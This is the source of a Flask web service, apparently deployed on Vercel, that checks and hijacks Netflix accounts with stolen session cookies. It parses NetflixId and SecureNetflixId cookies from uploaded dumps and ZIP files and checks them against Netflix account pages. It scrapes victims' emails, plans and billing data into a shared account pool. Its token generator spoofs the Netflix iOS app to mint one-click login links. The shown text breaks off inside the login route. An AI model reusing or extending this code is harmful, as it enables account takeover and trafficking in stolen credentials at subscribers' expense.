from flask import Flask, request, jsonify, send_from_directory, make_response, stream_with_context, Response, g
from flask_cors import CORS, cross_origin
from functools import wraps
import os
import io
import re
import json
import requests
import zipfile
import urllib.parse
import urllib3
from urllib3.exceptions import InsecureRequestWarning
import logging
import tempfile
import shutil
import uuid
import hashlib
import time
from datetime import datetime, timedelta, timezone
from supabase import create_client, Client
from gotrue.errors import AuthApiError
from dotenv import load_dotenv
from deep_translator import GoogleTranslator
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_talisman import Talisman
import secrets
from marshmallow import Schema, fields, validate, ValidationError
from bs4 import BeautifulSoup
import random
import string

load_dotenv()
urllib3.disable_warnings(InsecureRequestWarning)

app = Flask(__name__)
app.secret_key = os.environ.get('FLASK_SECRET_KEY') or secrets.token_hex(32)

# Vercel-compatible limiter (memory storage acceptable for serverless)
limiter = Limiter(app=app, key_func=get_remote_address, default_limits=[])

app.config['SESSION_TYPE'] = 'filesystem'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=24)
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

# Production-ready Talisman
Talisman(app, 
    force_https=False,
    strict_transport_security=True,
    content_security_policy={
        'default-src': "'self'",
        'script-src': "'self'",
        'style-src': "'self' 'unsafe-inline'"
    }
)

# Fixed CORS - removed wildcard with credentials
ALLOWED_ORIGINS = [
    "http://localhost:3000",
    "http://localhost:5000",
    "http://localhost:8080",
    "https://hakdowken.vercel.app",
    "https://nftoken.vonezis.me"
]

CORS(app, resources={
    r"/api/*": {
        "origins": ALLOWED_ORIGINS,
        "methods": ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
        "allow_headers": ["Content-Type", "Authorization", "X-Requested-With", "Accept", "Origin"],
        "supports_credentials": True,
        "max_age": 86400
    }
})

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Vercel temp directory
TEMP_DIR = "/tmp"

# Supabase configuration
SUPABASE_URL = os.environ.get('SUPABASE_URL', 'your-supabase-url')
SUPABASE_SERVICE_KEY = os.environ.get('SUPABASE_SERVICE_KEY', 'your-service-role-key')
SUPABASE_ANON_KEY = os.environ.get('SUPABASE_ANON_KEY', 'your-anon-key')
SUPER_ADMIN_EMAILS = os.environ.get('SUPER_ADMIN_EMAILS', '').split(',')
SUPER_ADMIN_IDS = os.environ.get('SUPER_ADMIN_IDS', '').split(',')

required_env = ['SUPABASE_URL', 'SUPABASE_SERVICE_KEY', 'SUPABASE_ANON_KEY']
missing = [var for var in required_env if not os.environ.get(var)]
if missing:
    logger.warning(f"Missing environment variables: {missing}")

supabase: Client = create_client(SUPABASE_URL, SUPABASE_SERVICE_KEY)

translator = GoogleTranslator(source='auto', target='en')

# =============================================================================
# ALL HELPER FUNCTIONS AND DECORATORS (DEFINED BEFORE USE)
# =============================================================================
def decode_unicode(text):
    """Decode unicode escapes like \x40 → @ and percent encoding"""
    if not text or not isinstance(text, str):
        return text
    try:
        decoded = text.encode('utf-8').decode('unicode-escape')
        decoded = urllib.parse.unquote(decoded)
        return decoded
    except:
        return text


def parse_next_billing_date(date_str):
    """Parse Netflix next billing date and return (formatted_str, days_left)"""
    if not date_str or date_str == "Unknown":
        return None, None

    date_str = date_str.strip()
    formats = [
        "%B %d, %Y", "%d %B %Y", "%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%B %d"
    ]

    parsed_date = None
    for fmt in formats:
        try:
            if fmt == "%B %d" and len(date_str.split()) == 2:
                year = datetime.now().year
                parsed_date = datetime.strptime(f"{date_str} {year}", "%B %d %Y")
            else:
                parsed_date = datetime.strptime(date_str, fmt)
            break
        except:
            continue

    if not parsed_date:
        try:
            from dateutil import parser
            parsed_date = parser.parse(date_str, fuzzy=True)
        except:
            return date_str, None

    if parsed_date.tzinfo is None:
        parsed_date = parsed_date.replace(tzinfo=timezone.utc)

    today = datetime.now(timezone.utc)
    days_left = (parsed_date - today).days

    return date_str, days_left


def is_super_admin(user_id):
    if not user_id:
        return False
    if str(user_id) in SUPER_ADMIN_IDS:
        return True
    try:
        result = supabase.table('user_profiles')\
            .select('is_super_admin, role')\
            .eq('id', str(user_id)).single().execute()
        if result.data:
            return result.data.get('is_super_admin') or result.data.get('role') == 'super_admin'
    except Exception as e:
        logger.error(f"Super admin check error: {e}")
    return False

class CookieCheckSchema(Schema):
    content = fields.String(required=True)
    mode = fields.String(validate=validate.OneOf(['check_only', 'generate_token']), missing='check_only')


def validate_input(data):
    schema = CookieCheckSchema()
    try:
        return schema.load(data), None
    except ValidationError as err:
        return None, err.messages


def require_auth(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        auth_header = request.headers.get('Authorization')
        if not auth_header or not auth_header.startswith('Bearer '):
            return jsonify({'status': 'error', 'message': 'Authentication required'}), 401

        token = auth_header.split(' ')[1]
        try:
            user_response = supabase.auth.get_user(token)
            if not user_response or not user_response.user:
                return jsonify({'status': 'error', 'message': 'Invalid token'}), 401
            g.user = user_response.user
            g.token = token
            return f(user_response.user, *args, **kwargs)
        except Exception as e:
            logger.error(f"Auth error: {e}")
            return jsonify({'status': 'error', 'message': 'Invalid or expired token'}), 401
    return decorated_function


def require_super_admin(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get('Authorization')
        if not auth_header or not auth_header.startswith('Bearer '):
            return jsonify({'status': 'error', 'message': 'Authentication required'}), 401
        token = auth_header.split(' ')[1]
        try:
            user_resp = supabase.auth.get_user(token)
            if not user_resp or not is_super_admin(user_resp.user.id):
                return jsonify({'status': 'error', 'message': 'Super admin required'}), 403
            return f(user_resp.user, *args, **kwargs)
        except Exception as e:
            logger.error(f"Super admin error: {e}")
            return jsonify({'status': 'error', 'message': 'Invalid token'}), 401
    return decorated

def ensure_ph_accounts_pool():
    """Ensure at least 8 PH premium accounts exist for super admin"""
    try:
        result = supabase.table('netflix_accounts')\
            .select('*', count='exact')\
            .eq('country', 'PH')\
            .eq('is_premium', True)\
            .eq('is_active', True)\
            .execute()
        
        current_count = result.count if hasattr(result, 'count') else len(result.data or [])
        
        if current_count < 8:
            logger.warning(f"PH accounts pool low: {current_count}/8. Super admin should add more.")
        
        return current_count
    except Exception as e:
        logger.error(f"Error checking PH accounts pool: {e}")
        return 0

def check_premium_status(user_id):
    try:
        result = supabase.table('user_profiles')\
            .select('is_premium').eq('id', user_id).single().execute()
        return result.data.get('is_premium', False) if result.data else False
    except Exception as e:
        logger.error(f"Error checking premium status: {e}")
        return False

def decode_unicode(text):
    if not text or not isinstance(text, str):
        return text
    try:
        return text.encode('utf-8').decode('unicode-escape')
    except:
        return text

def translate_plan_name(plan_name):
    if not plan_name or plan_name == "Unknown":
        return "Unknown"
    
    decoded = decode_unicode(plan_name)
    cleaned = decoded.strip().lower()
    cleaned_no_spaces = cleaned.replace(' ', '').replace('-', '').replace('_', '')
    
    PLAN_TRANSLATIONS = {
        'พรีเมียม': 'Premium', 'สแตนดาร์ด': 'Standard', 'เบสิก': 'Basic', 'โมบาย': 'Mobile',
        'โฆษณา': 'Standard with Ads', 'premium': 'Premium', 'estándar': 'Standard',
        'básico': 'Basic', 'básica': 'Basic', 'móvil': 'Mobile', 'con anuncios': 'Standard with Ads',
        'padrão': 'Standard', 'com anúncios': 'Standard with Ads', 'prêmio': 'Premium',
        'essentiel': 'Basic', 'avec publicité': 'Standard with Ads', 'sans publicité': 'Standard',
        'basis': 'Basic', 'werbefrei': 'Standard', 'base': 'Basic', 'standaard': 'Standard',
        'プレミアム': 'Premium', 'スタンダード': 'Standard', 'ベーシック': 'Basic', '広告付き': 'Standard with Ads',
        '프리미엄': 'Premium', '스탠다드': 'Standard', '베이직': 'Basic', '광고 포함': 'Standard with Ads',
        '高级': 'Premium', '标准': 'Standard', '基础': 'Basic', '含广告': 'Standard with Ads', '无广告': 'Standard',
        'премиум': 'Premium', 'стандарт': 'Standard', 'базовый': 'Basic', 'с рекламой': 'Standard with Ads',
        'بريميوم': 'Premium', 'ستاندرد': 'Standard', 'أساسي': 'Basic', 'مع إعلانات': 'Standard with Ads',
        'temel': 'Basic', 'standart': 'Standard', 'reklamlı': 'Standard with Ads',
        'podstawowy': 'Basic', 'z reklamami': 'Standard with Ads',
        'standar': 'Standard', 'dasar': 'Basic', 'dengan iklan': 'Standard with Ads',
        'cao cấp': 'Premium', 'tiêu chuẩn': 'Standard', 'cơ bản': 'Basic', 'có quảng cáo': 'Standard with Ads',
    }
    
    if cleaned in PLAN_TRANSLATIONS:
        return PLAN_TRANSLATIONS[cleaned]
    
    if any(keyword in cleaned or keyword in cleaned_no_spaces for keyword in 
           ['premium', 'uhd', 'ultra', '4k', 'hdr', 'พรีเมียม', '프리미엄', 'プレミアム', '高级', 'премиум', 'بريميوم', 'cao', 'prêmio']):
        return 'Premium'
    
    if any(keyword in cleaned or keyword in cleaned_no_spaces for keyword in 
           ['standard', 'standaard', 'estándar', 'padrão', 'スタンダード', '스탠다드', '标准', 'สแตนดาร์ด', 'standart', 'tiêu']):
        return 'Standard'
    
    if any(keyword in cleaned or keyword in cleaned_no_spaces for keyword in 
           ['basic', 'basis', 'básico', 'básica', 'ベーシック', '基础', 'เบสิก', 'essentiel', 'базовый', 'أساسي', 'temel', 'podstawowy', 'dasar', 'cơ', 'base']):
        return 'Basic'
    
    if any(keyword in cleaned or keyword in cleaned_no_spaces for keyword in 
           ['mobile', 'móvil', 'móvel', 'โมบาย']):
        return 'Mobile'
    
    if any(keyword in cleaned for keyword in 
           ['ads', 'ad', 'anuncios', 'anúncios', 'publicidad', 'werbung', 'reklam', 'iklan', 'quảng cáo', 'إعلانات', 'реклама', '広告']):
        return 'Standard with Ads'
    
    return decoded.title()

# def extract_netflix_id(content):
def extract_netflix_credentials(content):
    """
    Extract both NetflixId and SecureNetflixId from cookie data.
    Returns dict with 'netflix_id' and 'secure_netflix_id' or None if invalid.
    """
    netflix_id = None
    secure_netflix_id = None
    
    # Try JSON format (cookie export extensions)
    try:
        data = json.loads(content)
        if isinstance(data, list):
            for cookie in data:
                name = cookie.get("name", "")
                if name == "NetflixId":
                    netflix_id = cookie.get("value")
                elif name == "SecureNetflixId":
                    secure_netflix_id = cookie.get("value")
        elif isinstance(data, dict):
            if "NetflixId" in data:
                netflix_id = data["NetflixId"]
            if "SecureNetflixId" in data:
                secure_netflix_id = data["SecureNetflixId"]
            if "cookies" in data:
                for cookie in data["cookies"]:
                    name = cookie.get("name", "")
                    if name == "NetflixId":
                        netflix_id = cookie.get("value")
                    elif name == "SecureNetflixId":
                        secure_netflix_id = cookie.get("value")
    except:
        pass
    
    # Try regex patterns for plain text / Netscape format
    if not netflix_id:
        netflix_id_match = re.search(r'(?<!\w)NetflixId=([^;,\s]+)', content)
        if netflix_id_match:
            netflix_id = netflix_id_match.group(1)
            if '%' in netflix_id:
                try:
                    netflix_id = urllib.parse.unquote(netflix_id)
                except:
                    pass
    
    if not secure_netflix_id:
        secure_match = re.search(r'(?<!\w)SecureNetflixId=([^;,\s]+)', content)
        if secure_match:
            secure_netflix_id = secure_match.group(1)
            if '%' in secure_netflix_id:
                try:
                    secure_netflix_id = urllib.parse.unquote(secure_netflix_id)
                except:
                    pass
    
    # Netscape format
    if not netflix_id:
        netscape_match = re.search(
            r'\.netflix\.com\s+TRUE\s+/\s+TRUE\s+\d+\s+NetflixId\s+([^\s]+)', 
            content
        )
        if netscape_match:
            netflix_id = netscape_match.group(1)
            if '%' in netflix_id:
                try:
                    netflix_id = urllib.parse.unquote(netflix_id)
                except:
                    pass
    
    if not secure_netflix_id:
        netscape_secure = re.search(
            r'\.netflix\.com\s+TRUE\s+/\s+TRUE\s+\d+\s+SecureNetflixId\s+([^\s]+)', 
            content
        )
        if netscape_secure:
            secure_netflix_id = netscape_secure.group(1)
            if '%' in secure_netflix_id:
                try:
                    secure_netflix_id = urllib.parse.unquote(secure_netflix_id)
                except:
                    pass
    
    # Plain format fallback
    if not netflix_id:
        plain_match = re.search(r'NetflixId[=:\s]+([^\s;,\n]+)', content, re.IGNORECASE)
        if plain_match:
            netflix_id = plain_match.group(1)
            if '%' in netflix_id:
                try:
                    netflix_id = urllib.parse.unquote(netflix_id)
                except:
                    pass
    
    if not secure_netflix_id:
        plain_secure = re.search(r'SecureNetflixId[=:\s]+([^\s;,\n]+)', content, re.IGNORECASE)
        if plain_secure:
            secure_netflix_id = plain_secure.group(1)
            if '%' in secure_netflix_id:
                try:
                    secure_netflix_id = urllib.parse.unquote(secure_netflix_id)
                except:
                    pass
    
    if not netflix_id:
        return None
    
    return {
        'netflix_id': netflix_id,
        'secure_netflix_id': secure_netflix_id  # Can be None, but we store it
    }

def check_netflix_cookie(cookie_dict):
    """
    Check Netflix cookie validity using BOTH NetflixId and SecureNetflixId.
    cookie_dict should contain 'NetflixId' and optionally 'SecureNetflixId'.
    """
    session = requests.Session()
    session.cookies.update(cookie_dict)

    url = 'https://www.netflix.com/YourAccount'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    try:
        resp = session.get(url, headers=headers, timeout=30)
        txt = resp.text
        txt_lower = txt.lower()

        # Check 1: Redirected to login page = invalid cookie
        if '"mode":"login"' in txt_lower:
            # Try to determine if it's because SecureNetflixId is missing
            if not cookie_dict.get('SecureNetflixId'):
                return {'ok': False, 'err': 'Invalid cookie - SecureNetflixId may be required'}
            return {'ok': False, 'err': 'Invalid cookie'}

        # Check 2: Not on account page = not logged in
        if '"mode":"yourAccount"' not in txt:
            if 'payment' in txt_lower or 'billing' in txt_lower or 'update your payment' in txt_lower:
                return {'ok': False, 'err': 'Payment required'}
            if 'membership has been canceled' in txt_lower or 'canceled' in txt_lower:
                return {'ok': False, 'err': 'Membership canceled'}
            if 'restart' in txt_lower and 'membership' in txt_lower:
                return {'ok': False, 'err': 'Membership expired - restart required'}
            if 'unauthorized' in txt_lower or 'session expired' in txt_lower:
                return {'ok': False, 'err': 'Session expired'}
            return {'ok': False, 'err': 'Not logged in'}

        # Check 3: Account page loaded but check for specific expired states
        if 'your membership is on hold' in txt_lower or 'on hold' in txt_lower:
            return {'ok': False, 'err': 'Membership on hold'}
        
        if 'please update your payment method' in txt_lower:
            return {'ok': False, 'err': 'Payment method required'}

        def find(pattern, flags=0):
            m = re.search(pattern, txt, flags)
            return m.group(1).strip() if m else "Unknown"

        # Plan extraction (your existing code)
        raw_plan = find(r'"planName"\s*:\s*"([^"]+)"')
        if raw_plan == "Unknown":
            raw_plan = find(r'localizedPlanName[^}]+"value":"([^"]+)"')
        if raw_plan == "Unknown":
            raw_plan = find(r'"currentPlanName"\s*:\s*"([^"]+)"')
        if raw_plan == "Unknown":
            raw_plan = find(r'"plan"\s*:\s*"([^"]+)"')

        # Next Billing Date (your existing code)
        next_billing_raw = find(r'"nextBillingDate"\s*:\s*"([^"]+)"')
        if next_billing_raw == "Unknown":
            next_billing_raw = find(r'data-uia="nextBillingDate-item"[^>]*>([^<]+)<')
        if next_billing_raw == "Unknown":
            next_billing_raw = find(r'Next billing date[^:]*[:]\s*([^<"]+)', re.I)
        if next_billing_raw == "Unknown":
            next_billing_raw = find(r'next payment[^:]*[:]\s*([^<"]+)', re.I)

        next_billing_str, days_left = parse_next_billing_date(next_billing_raw)

        # Check 4: Billing expired
        is_expired = False
        if days_left is not None and days_left < -3:
            is_expired = True

        # Check 5: Membership status
        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        is_valid = bool(status_match)
        is_premium = is_valid and status_match.group(1) == 'CURRENT_MEMBER'
        
        # Check 6: If membershipStatus is not CURRENT_MEMBER, it's invalid
        if status_match and status_match.group(1) != 'CURRENT_MEMBER':
            status = status_match.group(1)
            if status == 'CANCELLED':
                return {'ok': False, 'err': 'Membership cancelled'}
            elif status == 'INACTIVE':
                return {'ok': False, 'err': 'Membership inactive'}
            elif status == 'HOLD':
                return {'ok': False, 'err': 'Membership on hold'}
            else:
                return {'ok': False, 'err': f'Membership status: {status}'}

        # Check 7: If no membership status found at all
        if not is_valid:
            return {'ok': False, 'err': 'No membership status found'}

        plan = translate_plan_name(raw_plan)

        signup_country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"')
        current_country = find(r'"currentCountry"\s*:\s*"([^"]+)"')
        membership_country = find(r'"country"\s*:\s*"([^"]+)"')
        
        locale = find(r'"locale"\s*:\s*"([^"]+)"')
        locale_country = locale.split('_')[0].upper() if locale and '_' in locale else None
        if not locale_country and locale and len(locale) == 2:
            locale_country = locale.upper()
        
        currency = find(r'"currency"\s*:\s*"([^"]+)"')
        currency_map = {
            'PHP': 'PH', 'USD': 'US', 'EUR': 'EU', 'GBP': 'GB', 'JPY': 'JP',
            'KRW': 'KR', 'THB': 'TH', 'IDR': 'ID', 'MYR': 'MY', 'SGD': 'SG',
            'AUD': 'AU', 'CAD': 'CA', 'MXN': 'MX', 'BRL': 'BR', 'ARS': 'AR',
            'CLP': 'CL', 'COP': 'CO', 'PEN': 'PE', 'CHF': 'CH', 'SEK': 'SE',
            'NOK': 'NO', 'DKK': 'DK', 'PLN': 'PL', 'CZK': 'CZ', 'HUF': 'HU',
            'RON': 'RO', 'BGN': 'BG', 'HRK': 'HR', 'TRY': 'TR', 'ILS': 'IL',
            'AED': 'AE', 'SAR': 'SA', 'ZAR': 'ZA', 'INR': 'IN', 'PKR': 'PK',
            'BDT': 'BD', 'LKR': 'LK', 'NPR': 'NP', 'MMK': 'MM', 'VND': 'VN',
            'TWD': 'TW', 'HKD': 'HK', 'CNY': 'CN', 'RUB': 'RU', 'UAH': 'UA',
            'KZT': 'KZ', 'EGP': 'EG', 'NGN': 'NG', 'KES': 'KE', 'GHS': 'GH'
        }
        currency_country = currency_map.get(currency, None)
        
        detected_country = None
        
        # [Keep all your existing country detection logic...]
        if '"es-ES"' in txt or 'es_ES' in txt or 'España' in txt:
            detected_country = 'ES'
        elif '"es-' in txt or 'espanol' in txt_lower or 'español' in txt_lower:
            detected_country = 'MX'
        elif '"pt-BR"' in txt or 'pt_BR' in txt or 'Brasil' in txt:
            detected_country = 'BR'
        # ... etc (keep all existing country detection) ...
        elif '"en-US"' in txt or 'en_US' in txt:
            detected_country = 'US'
        elif '"en-' in txt:
            detected_country = 'US'
        
        country = (
            current_country if current_country != "Unknown" else
            detected_country if detected_country else
            membership_country if membership_country != "Unknown" else
            signup_country if signup_country != "Unknown" else
            locale_country if locale_country else
            currency_country if currency_country else
            "Unknown"
        )

        email = find(r'"emailAddress"\s*:\s*"([^"]+)"')
        if email != "Unknown":
            email = urllib.parse.unquote(email)

        subscription_type = "Standard"
        plan_lower = plan.lower()

        if "premium" in plan_lower:
            subscription_type = "Premium"
        elif "standard" in plan_lower:
            subscription_type = "Standard"
        elif "basic" in plan_lower:
            subscription_type = "Basic"
        elif "mobile" in plan_lower:
            subscription_type = "Mobile"
        
        if plan == "Unknown" and is_premium:
            if any(indicator in txt_lower for indicator in ['"isuhdavailable":true', '"uhd":true', '"hdr":true', '"4k":true']):
                plan = "Premium (UHD)"
                subscription_type = "Premium"
            elif '"maxstreams":4' in txt_lower:
                plan = "Premium (4 screens)"
                subscription_type = "Premium"
            elif '"maxstreams":2' in txt_lower:
                plan = "Standard (2 screens)"
                subscription_type = "Standard"

        return {
            'ok': is_valid and is_premium and not is_expired,
            'premium': is_premium,
            'email': email,
            'country': country,
            'signup_country': signup_country if signup_country != "Unknown" else country,
            'plan': plan,
            'subscription_type': subscription_type,
            'detection_method': (
                'current_ip' if current_country != "Unknown" else
                'content_language' if detected_country else
                'membership' if membership_country != "Unknown" else
                'signup' if signup_country != "Unknown" else
                'locale' if locale_country else
                'currency' if currency_country else
                'unknown'
            ),
            'next_billing_date': next_billing_str,
            'days_until_billing': days_left,
            'is_expired': is_expired,
            'has_secure_id': bool(cookie_dict.get('SecureNetflixId'))  # New field
        }
        
    except Exception as e:
        logger.error(f"Error checking cookie: {str(e)}")
        return {'ok': False, 'err': str(e)}

def generate_token(netflix_id):
    url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    
    params = {
        'appVersion': "15.48.1",
        'config': '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        'device_type': "NFAPPL-02-",
        'esn': "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        'idiom': "phone",
        'iosVersion': "15.8.5",
        'isTablet': "false",
        'languages': "en-US",
        'locale': "en-US",
        'maxDeviceWidth': "375",
        'model': "saget",
        'modelType': "IPHONE8-1",
        'odpAware': "true",
        'path': '["account","token","default"]',
        'pathFormat': "graph",
        'pixelDensity': "2.0",
        'progressive': "false",
        'responseFormat': "json"
    }

    headers = {
        'User-Agent': "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        'x-netflix.request.attempt': "1",
        'x-netflix.request.client.user.guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
        'x-netflix.context.profile-guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
        'x-netflix.request.routing': '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        'x-netflix.context.app-version': "15.48.1",
        'x-netflix.argo.translated': "true",
        'x-netflix.context.form-factor': "phone",
        'x-netflix.context.sdk-version': "2012.4",
        'x-netflix.client.appversion': "15.48.1",
        'x-netflix.context.max-device-width': "375",
        'x-netflix.context.ab-tests': "",
        'x-netflix.tracing.cl.useractionid': "4DC655F2-9C3C-4343-8229-CA1B003C3053",
        'x-netflix.client.type': "argo",
        'x-netflix.client.ftl.esn': "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        'x-netflix.context.locales': "en-US",
        'x-netflix.context.top-level-uuid': "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        'x-netflix.client.iosversion': "15.8.5",
        'accept-language': "en-US;q=1",
        'x-netflix.argo.abtests': "",
        'x-netflix.context.os-version': "15.8.5",
        'x-netflix.request.client.context': '{"appState":"foreground"}',
        'x-netflix.context.ui-flavor': "argo",
        'x-netflix.argo.nfnsm': "9",
        'x-netflix.context.pixel-density': "2.0",
        'x-netflix.request.toplevel.uuid': "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        'x-netflix.request.client.timezoneid': "Asia/Dhaka",
        'Cookie': f"NetflixId={netflix_id}"
    }

    try:
        response = requests.get(url, params=params, headers=headers, timeout=30, verify=False)
        data = response.json()
        
        if "value" in data and data["value"] and "account" in data["value"]:
            token_data = data["value"]["account"]["token"]["default"]
            token = token_data["token"]
            expires = token_data["expires"]
            
            if len(str(expires)) == 13:
                expires //= 1000
            
            login_urls = {
                "phone": f"https://netflix.com/unsupported?nftoken={token}",
                "tv": f"https://netflix.com/tv8?nftoken={token}",
                "pc": f"https://netflix.com/browse?nftoken={token}"
            }
            
            return {
                "status": "Success",
                "token": token,
                "expires": expires,
                "login_urls": login_urls
            }
        return {"status": "Failure", "error": "No token"}
    except Exception as e:
        return {"status": "Error", "error": str(e)}

def extract_zip_and_get_files(zip_path, extract_dir):
    txt_files = []
    try:
        extract_dir = os.path.join(TEMP_DIR, os.path.basename(extract_dir))
        os.makedirs(extract_dir, exist_ok=True)
        
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        for root, dirs, files in os.walk(extract_dir):
            for file in files:
                if file.lower().endswith('.txt'):
                    txt_files.append(os.path.join(root, file))
        return txt_files
    except Exception as e:
        logger.error(f"Error extracting ZIP: {e}")
        return []

def store_netflix_account(email, netflix_id, secure_netflix_id, subscription_type, country, plan,
                         cookie_content, user_id, signup_country=None,
                         detection_method=None, is_exclusive=False,
                         reserved_for_admin=False, next_billing_date=None,
                         days_until_billing=None, is_expired=False):
    """Store account with BOTH NetflixId and SecureNetflixId"""
    try:
        clean_email = decode_unicode(email)

        # Skip clearly expired accounts
        if is_expired and days_until_billing is not None and days_until_billing < -5:
            logger.warning(f"Skipping expired account: {clean_email} ({days_until_billing} days)")
            return False, None

        adding_user_is_admin = is_super_admin(user_id)

        account_data = {
            'email': clean_email,
            'netflix_id': netflix_id,
            'secure_netflix_id': secure_netflix_id,  # NEW FIELD
            'subscription_type': subscription_type,
            'country': country,
            'signup_country': signup_country or country,
            'plan': plan,
            'is_premium': True,
            'cookie_data': cookie_content[:500] if cookie_content else None,
            'added_by': str(user_id),
            'last_checked': datetime.utcnow().isoformat(),
            'is_active': True,
            'detection_method': detection_method,
            'exclusive_access': is_exclusive if adding_user_is_admin else False,
            'reserved_for_super_admin': reserved_for_admin if adding_user_is_admin else False,
            'next_billing_date': next_billing_date,
            'days_until_billing': days_until_billing,
            'is_expired': is_expired
        }

        headers = {
            'apikey': SUPABASE_SERVICE_KEY,
            'Authorization': f'Bearer {SUPABASE_SERVICE_KEY}',
            'Content-Type': 'application/json',
            'Prefer': 'return=representation,resolution=merge-duplicates'
        }

        check_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=id&email=eq.{urllib.parse.quote(clean_email)}"
        check_resp = requests.get(check_url, headers=headers, timeout=30)

        if check_resp.status_code == 200 and check_resp.json():
            account_id = check_resp.json()[0]['id']
            update_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?id=eq.{account_id}"
            result = requests.patch(update_url, headers=headers, json=account_data, timeout=30)
            if result.status_code in [200, 204]:
                fetch = requests.get(f"{SUPABASE_URL}/rest/v1/netflix_accounts?id=eq.{account_id}", headers=headers)
                return True, fetch.json()[0] if fetch.status_code == 200 else None
        else:
            insert_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts"
            result = requests.post(insert_url, headers=headers, json=account_data, timeout=30)
            if result.status_code == 201:
                return True, result.json()[0] if result.json() else None

        return False, None

    except Exception as e:
        logger.error(f"Error storing account: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return False, None

def log_token_generation(account_id, user_id, ip_address, token=None):
    try:
        headers = {
            'apikey': SUPABASE_SERVICE_KEY,
            'Authorization': f'Bearer {SUPABASE_SERVICE_KEY}',
            'Content-Type': 'application/json',
            'Prefer': 'return=representation'
        }
        
        log_data = {
            'account_id': str(account_id),
            'generated_by': str(user_id),
            'ip_address': str(ip_address) if ip_address else None
        }
        
        if token:
            log_data['token_hash'] = hashlib.sha256(token.encode()).hexdigest()[:32]
            log_data['token'] = token[:100]
        
        url = f"{SUPABASE_URL}/rest/v1/token_logs"
        resp = requests.post(url, headers=headers, json=log_data)
        
        if resp.status_code == 201:
            logger.info(f"Token log SUCCESS")
            return True
        else:
            logger.error(f"Token log FAILED: {resp.status_code} - {resp.text}")
            return False
        
    except Exception as e:
        logger.error(f"Token log FAILED: {str(e)}")
        import traceback
        logger.error(traceback.format_exc())
        return False

# =============================================================================
# ROUTES START HERE
# =============================================================================

@app.after_request
def security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    return response

@app.route('/')
def home():
    return jsonify({"status": "ok", "message": "Netflix Cookie Checker API running"})

# @app.route('/')
# def serve_index():
#     return jsonify({
#         "status": "ok",
#         "message": "Netflix Cookie Checker API is running",
#         "endpoints": {
#             "test": "/api/test",
#             "signup": "/api/auth/signup",
#             "login": "/api/auth/login",
#             "check": "/api/check",
#             "accounts": "/api/accounts"
#         }
#     })

@app.route('/api/auth/signup', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
def signup():
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
        
        if not email or not password:
            return jsonify({'status': 'error', 'message': 'Email and password required'})
        
        auth_response = supabase.auth.sign_up({
            "email": email,
            "password": password
        })
        
        return jsonify({
            'status': 'success',
            'message': 'User created successfully',
            'user': {
                'id': auth_response.user.id,
                'email': auth_response.user.email
            }
        })
    except AuthApiError as e:
        return jsonify({'status': 'error', 'message': str(e)})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/test', methods=['GET', 'OPTIONS'])
def test():
    return jsonify({"status": "ok", "message": "API is working!"})

@app.route('/api/auth/login', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
def login():
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
        
        if not email or not password:
